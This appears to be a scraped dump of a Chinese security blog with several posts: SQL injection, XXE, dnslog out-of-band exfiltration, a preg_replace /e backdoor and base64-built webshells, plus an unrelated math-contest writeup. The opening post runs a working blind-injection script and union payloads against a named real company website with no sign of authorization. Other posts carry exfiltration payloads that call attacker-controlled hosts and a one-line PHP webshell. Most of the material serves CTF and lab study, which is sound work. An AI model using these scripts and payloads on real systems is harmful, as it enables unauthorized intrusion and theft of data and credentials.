顺手查了下MariaDB的注入 不过没用上 还有一个搜索框 但是尝试注入不管输的是啥都报错 而且看url这个请求不是get 翻了下源码没找到post的参数 随手点了点页面上的连接 出现了熟悉的?id= 尝试利用尝试 ?id=20^1 ?id=20^0 发现不行 ?id=20 and 1 ?id=20 and 0 回显信息不同 可以利用 不放心又试了一下 ?id=20 and 1 ascii(substr((select database()),1,1))&gt;64 ?id=20 and 1 ascii(substr((select database()),1,1))&gt;127 回显的确不同 正常情况右下角会回显出 news 的相关信息 可以盲注 但是还有个坑点。。在 id=20时虽然回显的不同 但由于回显的信息太短 在错误情况下页面里的其它地方也有 Keterbukaan Informasi Transaksi Afiliasi 这句。。 if “Keterbukaan Informasi Transaksi Afiliasi” not in s.content没跑出来 换了个 ?id=2 这次回显的长多了 没重复 成功跑出 跑脚本1234567891011121314151617181920# -*- coding:utf8 -*-import requestsflag = \"\"url = \"http://www.kabelindo.co.id/readnews.php?id=2 and \"for i in range(1,500): for j in range(96,127): #payload =\"ascii(substr((select database()),%s,1))&gt;%s --+\"%(i,j) #payload=\"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s --+\"%(i,j) payload=\"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%s,1))&gt;%s --+\"%(i,j) #payload=\"ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=database() and TABLE_NAME=''),%s,1))&gt;%s --+\"%(i,j) #payload=\"ascii(substr((select group_concat(username) from users),%s,1))&gt;%s --+\"%(i,j) #payload=\"ascii(substr((select group_concat(password) from users),%s,1))&gt;%s --+\"%(i,j) url1 = url+payload #print url1 s = requests.get(url=url1) #print \"i:\",i,\"j:\",j if \"Pada tahun 2013, RUPS PT Kabelindo Murni Tbk. diadakan pada tanggal 12 Juni 2013\" not in s.content: flag += chr(j) print flag break 跑出数据库名 跑表名时 它这个表名太多 导致大量请求总是被ban 就很烦 不能用group_concat一下跑完 只能上limit一个一个看 select count(*) from xx 可以看数量 一共有22个表 …… 最后一个payload=&quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 21,1),%s,1))&gt;%s --+&quot;%(i,j) 然后类似跑字段 再跑出 用户 密码 等等 表太多了费时间就没跑 但是可以直接回显出来 dnslog既然可以盲注 借助dnslog回显应该也是可以的 还没试 直接注入这题直接注入还是炒鸡简单的 啥都没过滤 看下列数 payload: http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,7,group_concat(table_name，0x0a),8,5 from information_schema.tables where table_schema=database() --+ 这里要注意一点就是它的回显位置只有中间的三个 (看对应显示出的数字) 所以要把group_concat放在中间的三个位置上 否则没回显 还有group_concat加了个 0x0a 参数是为了在页面上显示完全 否则一行显示不完 要到源代码里看全部的 当然如果是盲注不用加","categories":[],"tags":[]},{"title":"XXE学习","slug":"XXE学习","date":"2018-03-04T14:41:29.000Z","updated":"2018-03-23T05:31:20.560Z","comments":true,"path":"2018/03/04/XXE学习/","link":"","permalink":"http://Merl1ng.com/2018/03/04/XXE学习/","excerpt":"这种题遇到的蛮多的 还是要学习下","text":"这种题遇到的蛮多的 还是要学习下 什么是xml实体内部实体&lt;!ENTITY 实体名称 “实体内容”&gt; 外部实体&lt;!ENTITY 实体名称 SYSTEM “URI”&gt; 参数实体&lt;!ENTITY % 实体名称 “实体内容”&gt;或者&lt;!ENTITY % 实体名称 “URI”&gt; SYSTEM或者PUBLIC 表示外部资源申请 有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现 这些定义的’实体’能够访问本地或者远程的内容 判断是否存在xml(外部实体)注入观察 Content-Type 是否涉及 application/xml 和 text/xml 两种类型 (两者功能一样只是编码方式不同) 读取本地文件123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/password\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 在上面的代码中， XML外部实体 ‘file’(名字随便起) 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’file’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’file’实体的值将从其后的URI中读取 (root也是随便起的) 或者1234&lt;!DOCTYPE xdsec[&lt;!ELEMENT methodname ANY&gt;&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/user&gt; 过滤了&lt;!ENTITY时 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root SYSTEM \"http:xxx\"&gt;&lt;root&gt;&amp;file;&lt;/root&gt; bind xxe处理无回显的xml注入 需要有一台vps 在vps上放1.xml文件 12&lt;!ENTITY % f SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\"&gt;&lt;!ENTITY % all \"&lt;!ENTITY % s SYSTEM 'http://你的vps/xxe.php?f=%f;'&gt;\"&gt; 再放xxe.php 123&lt;?php file_put_contents(\"/tmp/1.txt\", $_GET['f']);?&gt; 最后在题目中可以写xml的页面写如下: 123456&lt;!DOCTYPE ANY[ &lt;!ENTITY % r SYSTEM \"http://你的vps/1.xml\"&gt; %r; %all; %s;]&gt; 访问1.txt就可以获得flag的内容 其中的%r; %all; %s; 分别是 实体 %remote; %all; %send; 版本影响XXE的利用跟php版本没有关系，而是xmllib的版本问题 xmllib2.9.0以后，是默认不解析外部实体的","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"http://Merl1ng.com/tags/xxe/"}]},{"title":"sqli-labs学习","slug":"sqli-labs学习","date":"2018-03-03T10:19:09.000Z","updated":"2018-03-13T14:25:15.592Z","comments":true,"path":"2018/03/03/sqli-labs学习/","link":"","permalink":"http://Merl1ng.com/2018/03/03/sqli-labs学习/","excerpt":"借助sqli-labs 系统学习下注入","text":"借助sqli-labs 系统学习下注入 less 1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)?id=1 ?id=2 显示出不同的信息?id=1’ 报错 接着使用and ‘1’=’1和and ‘1’=’2两个语句 再来尝试判断一下是否存在SQL注入漏洞（闭合最后的单引号） 通过结果判断有无注入漏洞 ?id=1’ order by 3–+ 来推断有多少个字段 然后联合注入 ?id=1’ union select 1,2,3 %23 1,2,3 这几个数字是用来凑数的 凑够和union前面的字段一样 这里补充几个常用函数user()返回当前数据库连接使用的用户，database()返回当前数据库连接使用的数据库，version()返回当前数据库的版本 另外，通常会使用concat或者concat-ws函数来将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串 concat_ws(char(32,58,32),user(),database(),version()) 其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:) 即为分隔符 通过这样的方式也可以绕过一些简单的过滤机制 ?id=1’ union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) %23 但是当我们这样输进去发现回显的信息并无改变 查询到的信息都是union select语句前的代码所造成的 这是因为源码里采用了mysql_fetch_array() 函数 它是从结果集中取得一行作为关联数组，或数字数组，或二者兼有，也就是说，只会取其中的一行然后来进行相应的输出 为了让后面的select语句顺利执行并显示出来，必须让前面的语句失效，可以通过将id的值设置为0或者是字符串、负数等（不是正整数即可）来实现将前面的SELECT语句（亦即union左边的select语句）查询的结果为空集，从而能够将后面的查询结果（union右边的select查询语句）显示出来 如?id=-1’ union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) %23 这样我们便得到了数据库的名字 开始下一步查表名 ?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=库名的十六进制%23 这次查询中使用到了group_concat函数，会返回带有来自一个组的连接的非NULL值的字符串结果，也就是会返回属于同一组的行或列的内容 除了用group_concat函数，还可以使用LIMIT来遍历出有哪些表，期间只需要改变limit中第一个参数的值使其从0开始逐渐递增即可 我们可以发现一共有四张表 其中user表根据经验是最重要的 所以我们对它进行列名的查询 ?id=-1’union select 1,2,group_concat(column_name) from information_schema.COLUMNS where table_schema=database() and TABLE_NAME=’’%23 (遇到过一个题用table_scheam=就一直不行 但是直接还用table_name=’xxx’就爆出来了) 发现这张表有三列 id username password id=-1’ union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users %23 这里将group_concat和concat_ws函数进行组合使用，一次性列出了所有的信息 less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)发现加个单引号跟没加显示不一样，加了单引号连you are in都不显示了，没有报错，所以只能用盲注判断了 盲注需要掌握一些MySQL的相关函数 length(str)：返回str字符串的长度substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始mid(str,pos,len):跟上面的一样，截取字符串 ascii(str)：返回字符串str的最左面字符的ASCII代码值ord(str):同上，返回ascii码 if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 常见的ASCII，A:65,Z:90 a:97,z:122 0:48 9:57 首先select database()查询数据库 ?id=1’ and ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码 ?id=1’ and ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0 ?id=1’ and ascii(substr((select database()),1,1))&gt;64 %23 (%23或者–+) 得到库名后再查询表名 (也可以省略查库名这一步) ?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;64 –+ 把limit换成group_concat也是阔以的 但是要注意盲注时这两个必须用一个 否则一直会错误 当然一个一个手动是非常累的 所以我们采用脚本自动化处理 贴一个非常简洁的py 123456789101112131415# -*- coding:utf8 -*-import requestsflag = \"\"url = \"http://xxxxxxx?id=1' and \"for i in range(1,500): for j in range(33,127): payload = \" ascii(substr((select database()),%s,1))&gt;%s --+\"%(i,j) url1 = url+payload #print url1 s = requests.get(url=url1) # print \"i:\",i,\"j:\",j if \"You are in...........\" not in s.content:#not有无看具体情况 flag += chr(j) print flag break 其中%(i,j)意思是%i赋给第一个%s,%j赋给第二个%s payload=”ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s –+”%(i,j) payload=”ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=’users’),%s,1))&gt;%s –+”%(i,j) payload=”ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=database() and TABLE_NAME=’users’),%s,1))&gt;%s –+”%(i,j) 这里有一点蛮有趣的情况 查列名时如果不加库名的限定:table_schema=database()查出来的列名则不会完全匹配 好像会把所有的都查出来 正确的列名是 id username password 而不加table_schema=database() 查出来的是 user_id first_name last_name user password avatar last_login failed_login id username password 最后payload=”ascii(substr((select group_concat(username) from users),%s,1))&gt;%s –+”%(i,j) payload=”ascii(substr((select group_concat(password) from users),%s,1))&gt;%s –+”%(i,j) 跑出username 和 password 还有 有些题目可能直接给你了字段名 这时可以直接 “ascii(substr(username ,%s,1))&gt;%s%%23”%(i,j) 不过这样加上group_concat会报错 好像只能查出一个 还有如果查询的东西不会混的话 可以省略 from xxx “ascii(substr((select group_concat(password)),%s,1))&gt;%s –+”%(i,j)","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"}]},{"title":"dnslog利用","slug":"dnslog利用","date":"2018-03-02T14:28:21.000Z","updated":"2018-03-07T05:07:22.915Z","comments":true,"path":"2018/03/02/dnslog利用/","link":"","permalink":"http://Merl1ng.com/2018/03/02/dnslog利用/","excerpt":"看wp时遇到一个无回显的ping题目 需要用到dnslog 系统学习一下","text":"看wp时遇到一个无回显的ping题目 需要用到dnslog 系统学习一下 命令注入\\盲打RCE(远程代码执行) -ping基本使用拿dvwa的命令注入举例 当发现疑似命令注入的洞，但是目标站点什么也不显示，无法确认是不是有洞 这里使用知道创宇的ceye.io平台 如果是win系统 可以ping %os%.domain.cete.io 如果得到os的信息，那么就说明这里存在命令注入 类似的 ping %USERNAME%.domain.ceye.io 对我来说去ceye看就会显示Saber (懒得打码就不贴图了) 附一个windows下常用变量 如果是在linux下 (其实ctf的话对方题目一般都会部署在linux下) 可以 1curl http://ip.port.domain.ceye.io/`whoami` 或者1ping `whoami`.ip.port.domain.ceye.io 这里用了一点反引号可以直接执行命令 就以curl举例 改变一些参数 如改成ls curl http://ip.port.b182oj.ceye.io/`ls` 但是在平台上只打印出了第一列的值 要打出剩余的就要使用sed命令 sed命令作为Linux三剑客之一，功能十分强大 1234567891011121314151617181920212223242526-n, --quiet, --silent suppress automatic printing of pattern space-e script, --expression=script add the script to the commands to be executed-f script-file, --file=script-file add the contents of script-file to the commands to be executed--follow-symlinks follow symlinks when processing in place-i[SUFFIX], --in-place[=SUFFIX] edit files in place (makes backup if SUFFIX supplied)-l N, --line-length=N specify the desired line-wrap length for the `l' command--posix disable all GNU extensions.-r, --regexp-extended use extended regular expressions in the script.-s, --separate consider files as separate rather than as a single continuous long stream.-u, --unbuffered load minimal amounts of data from the input files and flush the output buffers more often-z, --null-data separate lines by NUL characters --help display this help and exit --version output version information and exit 需要用到这里的-n 分别ls | sed -n ‘1p’ ls | sed -n ‘2p’ ls | sed -n ‘3p’ 但还是可能会出现新的问题 就是打出来的信息可能会受到长度的限制 所以还需用到 cut 命令 123456789101112131415-b, --bytes=LIST select only these bytes-c, --characters=LIST select only these characters-d, --delimiter=DELIM use DELIM instead of TAB for field delimiter-f, --fields=LIST select only these fields; also print any line that contains no delimiter character, unless the -s option is specified-n (ignored) --complement complement the set of selected bytes, characters or fields-s, --only-delimited do not print lines not containing delimiters --output-delimiter=STRING use STRING as the output delimiter the default is to use the input delimiter-z, --zero-terminated line delimiter is NUL, not newline --help display this help and exit --version output version information and exit ls | sed -n ‘3p’ | cut -c 1-5 故此可以打出任意行，任意长度的信息 happymoctf的一道盲打RCE题目名字叫 ping一下好吗 同样利用ceye.io平台 由于题目放在Linux下 我们需要使用linux命令 直接选择数据带出 ip=whoami.domain.ceye.io 在平台发现数据成功带出 于是直接ls，为防止特殊字符无法打出，base64一下 ip=ls |base64.domain.ceye.io 即可得到 Y3NzCmV4ZWMucGhwCmdoZGYucGhwCmluZGV4Lmh0bWwK 解码 cssexec.phpghdf.phpindex.html ip=cat ghdf.php.domain.ceye.io 看到flag 安恒2月月赛的一道题和上面的题目非常类似 题目页面只有一个ping命令 通过robots.txt看到有 index.txt和where_is_falg.php 同样利用ceye.io平台 由于题目放在Linux下 我们需要使用linux命令 ping=‘cat where_is_falg.php|sed s/[[:space:]]//g‘.domain.ceye.io 在平台看到下一个入口 ping=‘cat xxxxxx|sed s/[[:space:]]//g‘.domain.ceye.io 在平台即可看到flag [:space:] 匹配空白字符，包括空格，tab 官方writeuphttp://forum.91ctf.com/index.php/group/topic/id-40 sql盲注盲注的利用方法 逻辑法或者延时法 要一个字符一个字符去猜，要发送大量的get请求， 这种行为很容易被目标物理防火墙认定位是黑客行为 最终导致IP被ban 如果利用dnsLog来获取信息，既高效又避免这种情况发生 mysql中load_file()函数可以用来发送dns解析请求 利用payload: load_file(concat(‘\\\\‘,(select database()),’.domain.ceye.io\\a.txt’)) 例如/?id=1’ and if(select load_file(concat(‘\\\\‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’.domain.ceye.io\\a.txt’))),1,1) –+ 后来我才知道用dnslog辅助盲注的方法就是17hctf第二个web里说的oob (Out-of-Band 攻击) 不过那道题还要加上 sql server 的 openquery 函数 参考文章http://skysec.top/2017/12/29/Time-Based-RCE/http://www.mottoin.com/93274.htmlhttps://bbs.ichunqiu.com/thread-22002-1-1.html","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"dnslog","slug":"dnslog","permalink":"http://Merl1ng.com/tags/dnslog/"}]},{"title":"2018美赛","slug":"2018美赛","date":"2018-02-15T10:13:02.000Z","updated":"2018-02-28T05:36:55.190Z","comments":true,"path":"2018/02/15/2018美赛/","link":"","permalink":"http://Merl1ng.com/2018/02/15/2018美赛/","excerpt":"打得好累啊 惯例先贴结束时桌面","text":"打得好累啊 惯例先贴结束时桌面 选题赛前准备选b/c 放题看了看c切不动 又看了看e b和e其实纠结了好久 最终选的b 赛后的统计(不着是不是官方的) COMAP最后的统计信息：A题2564B题3487C题4791D题3228E题6253F题609总计20932，近500队没有成功提交或弃赛 选f的应该都是大神hhh 赛题想了想还是贴英文的吧 2018 MCM Problem B: How Many Languages? Background: There are currently about 6,900 languages spoken on Earth. About half the world’s population claim one of the following ten languages (in order of most speakers) as a native language: Mandarin (incl. Standard Chinese), Spanish, English, Hindi, Arabic, Bengali, Portuguese, Russian, Punjabi, and Japanese. However, much of the world’s population also speaks a second language. When considering total numbers of speakers of a particular language (native speakers plus second or third, etc. language speakers), the languages and their order change from the native language list provided. The total number of speakers of a language may increase or decrease over time because of a variety of influences to include, but not limited to, the language(s) used and/or promoted by the government in a country, the language(s) used in schools, social pressures, migration and assimilation of cultural groups, and immigration and emigration with countries that speak other languages. Moreover, in our globalized, interconnected world there are additional factors that allow languages that are geographically distant to interact. These factors include international business relations, increased global tourism, the use of electronic communication and social media, and the use of technology to assist in quick and easy language translation. Retrieved from https://en.wikipedia.org/wiki/List_of_languages_by_total_number_of_speakers on January 17, 2018. Problem: A large multinational service company, with offices in New York City in the United States and Shanghai in China, is continuing to expand to become truly international. This company is investigating opening additional international offices and desires to have the employees of each office speak both in English and one or more additional languages. The Chief Operating Officer of the company has hired your team to investigate trends of global languages and location options for new offices. Part I: A. Consider the influences and factors described in the background paragraph above, as well as other factors your group may identify. Based on projected trends, and some or all of these influences and factors, model the distribution of various language speakers over time. B. Use your model to predict what will happen to the numbers of native speakers and total language speakers in the next 50 years. Do you predict that any of the languages in the current top-ten lists (either native speakers or total speakers) will be replaced by another language? Explain. C. Given the global population and human migration patterns predicted for the next 50 years, do the geographic distributions of these languages change over this same period of time? If so, describe the change.Part II:A. Based on your modeling from Part I, and assuming your client company wants to open six new international offices, where might you locate these offices and what languages would be spoken in the offices? Would your recommendations be different in the short term versus the long term? Explain your choices.B. Considering the changing nature of global communications, and in an effort to save your client company resources, might you suggest that the company open less than six international offices? Indicate what additional information you would need and describe how you would analyze this option in order to advise your client. Part III:Write a 1-2 page memo to the Chief Operating Officer of the service company summarizing your results and recommendations.Note: In your analysis, ignore unpredictable or high-impact, low probability events such as asteroid collisions that would cause a catastrophic jump in evolutionary trends over time, and possibly render all languages extinct.Your submission should consist of:  One-page Summary Sheet,  Two-page memo,  Your solution of no more than 20 pages, for a maximum of 23 pages with your summary and memo.  Note: Reference list and any appendices do not count toward the 23-page limit and should appear after your completed solution.Attachments: List of Languages by Total Numbers of SpeakersReferences: Lane, J. (2017). The 10 Most Spoken Languages in the World. Babbel Magazine. Retrieved from https://www.babbel.com/en/magazine/the-10-most-spoken-languages-in-the-worldNoack, R. and Gamio, L. (April 23, 2015). The World’s Languages in 7 Maps and Charts. The Washington Post. Retrieved from https://www.washingtonpost.com/news/worldviews/wp/2015/04/23/the-worlds-languages-in-7-mapsand-charts/?utm_term=.a993dc2a15cbList of Languages by Total Numbers of Speakers https://en.wikipedia.org/wiki/List_of_languages_by_total_number_of_speakersList of Languages by Total Numbers of Speakers. Retrieved from https://en.wikipedia.org/wiki/List_of_languages_by_total_number_of_speakers on January 17, 2018. 总体思路一共建了三个模型 1a1b-&gt;基于多元线性回归和指数平滑法的语言数量分布模型1c-&gt;基于Agent社会圈子空间分布的语言地理分布模型2a2b-&gt;基于整数规划的寻址规划模型具体细节等想写的时候再写XD","categories":[],"tags":[]},{"title":"preg_replace后门","slug":"preg_replace后门","date":"2018-01-20T14:31:32.000Z","updated":"2018-01-27T07:27:18.573Z","comments":true,"path":"2018/01/20/preg_replace后门/","link":"","permalink":"http://Merl1ng.com/2018/01/20/preg_replace后门/","excerpt":"php中preg_replace用来正则替换所有符合条件的字符串 最近在看正则 刚好记录下","text":"php中preg_replace用来正则替换所有符合条件的字符串 最近在看正则 刚好记录下 题目题目是XCTF的一道新题 题目连接 http://47.104.74.209:20005/index.php?page=index 首先想到文件包含http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 读到源码 其中第121行 12345678910111213141516&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 发现是 preg_replace 后门 preg_replace函数先了解一下这个函数 preg_replace（）是 php里面的正则函数 用来正则替换所有符合条件的字符串 最近在学python爬虫时学习了点正则表达式 改脚本时遇到了个replace函数 如xxx.replace(‘?’,’’)会把指定文本中的?替 换为空 但是这个好像不是正则表达式 只是单纯的替换 python中类似的还有参考http://blog.csdn.net/zcmlimi/article/details/47709049 回到php的preg_replace函数中来 PHP preg_replace() 正则替换，与Javascript 正则替换不同，PHP preg_replace() 默认就是替换所有符号匹配条件的元素 preg_replace函数原型 Preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit = -1 [,int $count ]]) 有五个参数,有三个是必须参数 $pattern 可以是字符串,字符串数组,或者preg $replace 是用于替换的字符串或字符串数组 $subject 目标字符串或者目标字符串数组 $limit 每个模式在每个$subject上最大的替换次数,默认是-1(无限次) $count 返回在目标字符串所替换的次数 大概表示在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 默认替换所有符号匹配条件的元素 举个例子 如 123$string='[b]粗体字[/b]';$b_rst=preg_replace('/\\[b\\](.*)\\[\\/b\\&#125;/i','&lt;b&gt;$1&lt;/b&gt;',$string);echo $b_rst; /i 表示不区分大小写 第二个参数中的（$n）：匹配的是第一个参数中的第n个括号中的内容 (.*)表示匹配任意一个长度大于等于0的字符串,这里匹配,[b]之间的汉字. 点表示任意字符,*表示字符长度大于等于0 用()括起来表示匹配到的字符串可以作为一个变量被其他表达式使用,第一个()里面的内容就是变量1,被其他表达式引用的时候用$1代表 如果正则表达式里面有第二个(),那么第二个()匹配到的内容就可以用$2被其他表达式引用,以此类推 [和/和]是正则表达式内部要用到的符号,所以在匹配[和]的时候要用[和\\/和]来转义 所以[b]就匹配[b] 1所以'/\\[b\\](.*)\\[\\/b\\&#125;/i','&lt;b&gt;$1&lt;/b&gt;'就是把[b]粗体字[/b]替换成&lt;b&gt;粗体字&lt;/b&gt; 其他的一些可以参考https://www.cnblogs.com/chenshishuo/p/4912456.htmlhttp://www.jb51.net/article/46458.htm preg_replace危险的/e修饰符(一句话后门常用)先看下 PHP 正则表达式修饰符 修饰符被放在PHP正则表达式定界符“/”尾部，在正则表达式尾部引号之前。 i 忽略大小写，匹配不考虑大小写m 多行独立匹配，如果字符串不包含[\\n]等换行符就和普通正则一样。s 设置正则符号 . 可以匹配换行符[\\n]，如果没有设置，正则符号.不能匹配换行符\\n。x 忽略没有转义的空格e eval() 对匹配后的元素执行函数。A 前置锚定，约束匹配仅从目标字符串开始搜索D 锁定$作为结尾，如果没有D，如果字符串包含[\\n]等换行符，$依旧依旧匹配换行符。如果设置了修饰符m，修饰符D 就会被忽略。S 对非锚定的匹配进行分析U 非贪婪，如果在正则字符量词后加“?”，就可以恢复贪婪X 打开与perl 不兼容附件u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要这个 我们知道eval函数在php内经常被用来执行一句话木马 被认为是十分不安全的 如 1&lt;?php @eval($_POST['c']);?&gt; 即 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后） 提示:要确保replacement 构成一个合法的 PHP 代码字符串,否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误 如我们构造 123&lt;? echo preg_replace(\"/test/e\",$_GET[\"h\"],\"jutst test\"); ?&gt; 如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行） 如果提交的是?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39) .chr(100).chr(97).chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39) .chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36) .chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 对应的明文是：?h=fputs(fopen(data/a.php,w),&lt;?php eval($_POST[cmd])?&gt;); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。 (Chr，返回以数值表达式值为编码的字符 (ASCII码)) 还有更加有难度的例子参考http://www.jb51.net/article/38714.htm 题目利用调用方法： preg_replace(“/test/e”,phpinfo(),”jutst test”); 所以下面构造payload，需要注意的是 $_SERVER[‘HTTP_X_FORWARDED_FOR’] === ‘127.0.0.1’ 我们需要改xff为127.0.0.1才能触发后门 pat=/test/e&amp;rep=phpinfo()&amp;sub=jutst%20test (rep=system(‘ls’)也可以) 发现一个可疑文件夹s3chahahaDir 通过改变参数执行命令 rep=system(‘ls+s3chahahaDir’) 发现flag文件夹 好像 cd s3chahahaDir &amp;&amp; ls 也可以 rep=system(‘ls+s3chahahaDir/flag’) 继续发现flag.php 最后 rep=system(‘cat+s3chahahaDir/flag/flag.php’) 读到flag","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"base64-webshell","slug":"base64-webshell","date":"2017-12-25T14:30:10.000Z","updated":"2017-12-27T15:22:31.365Z","comments":true,"path":"2017/12/25/base64-webshell/","link":"","permalink":"http://Merl1ng.com/2017/12/25/base64-webshell/","excerpt":"题目来源于XDCTF的一道web","text":"题目来源于XDCTF的一道web 首先题目存在文件包含漏洞 可以通过 php://filter/convert.base64-encode/resource=index.php 读取到目标服务器源码 发现 upload.php 的上传的规则 将上传的文件中非 acgtACGT 的所有字符替换为空然后再保存 那么也就是说我们上传的文件中只能允许 acgtACGT 这四个字符通过 即要用这八个字符构造webshell 这就要利用base64的一些特性来实现 base 64 特性任何由 {A-Z|a-z|0-9|+|/} 组合的字符串（如果不够4的倍数可以用’=’补全），如果长度为4的倍数 则都可以作为base64解码的材料，而在base64decode的时候，会产生原字符串包含字符集以外的字符 如 字符串aaaa进行base64解码： 结果为i�� 有一部分为乱码 但是至少产生了一个额外的、可以被利用的字符i base64编码是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元 对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。 也就是说3个字节进行base64编码之后是4个字节 四个字节解码后为三个字节。 因此base64有一个特性，就是以四位为一个单位，多个单位组合起来，进行多次解密，得到的结果和组合的顺序相同 123456789的编码结果为MTIzNDU2Nzg5，我们把加密后的字符串四个为一组拆开MTIz（123）、NDU2（456）、Nzg5（789） 组合为Nzg5NDU2MTIz 得到 789456123 base64还有一个特性，就是会自动抛弃不符合要求的字符，如果要进行解密的base64字符串包括有不合法的字符 也就是不在集合 {A-Z|a-z|0-9|+|/} 里，同时也不是末尾的等号的字符会被自动抛弃 aaaa的解密结果为i�� iiii的解密结果为�(� 如果我们把aaaa的解密结果重复四遍，再进行解密 结果和iiii的解密结果是一样的 所以我们可以得出 ① 编码和解码不是唯一对应，就是说字母a可能通过不同的，其它字符的组合进行base64解码解出来。（组合种类远多于base64的合法字符种类） ② 被解码的字符，以四位为一个单位，多个单位组合起来，进行多次解密，得到的结果和组合的顺序相同。 ③ 我们的一句话&lt;?php @eval($_POST[a]);?&gt;，可以通过解密另一个字符串，我们假设为字符串一号获得 而字符串一号可以通过解密字符串二号获得，并且这种序列不是唯一的。 我们有可能找到仅仅由acgtACGT这8个字符组合起来的一串字符 这串字符在经过n次解密后的结果为我们的一句话木马 当然，在这个过程中要保证四位一组，否则会乱序 webshell这里直接贴上一航大佬的代码和脚本 https://gist.github.com/WangYihang/144d39888a05ba307d6356c9e9fc80c6 https://gist.github.com/WangYihang/a49c663237e68822dd4816e99534ca72 演示视频https://asciinema.org/a/140670","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"base64","slug":"base64","permalink":"http://Merl1ng.com/tags/base64/"}]},{"title":"小美赛总结","slug":"小美赛总结","date":"2017-12-06T05:17:36.000Z","updated":"2017-12-28T14:31:17.265Z","comments":true,"path":"2017/12/06/小美赛总结/","link":"","permalink":"http://Merl1ng.com/2017/12/06/小美赛总结/","excerpt":"第一次参赛，啥都不会没弃赛感觉还可以XD","text":"第一次参赛，啥都不会没弃赛感觉还可以XD 最后结束时凌乱的桌面 赛题回顾原题都是英文 这里贴翻译过后的题目 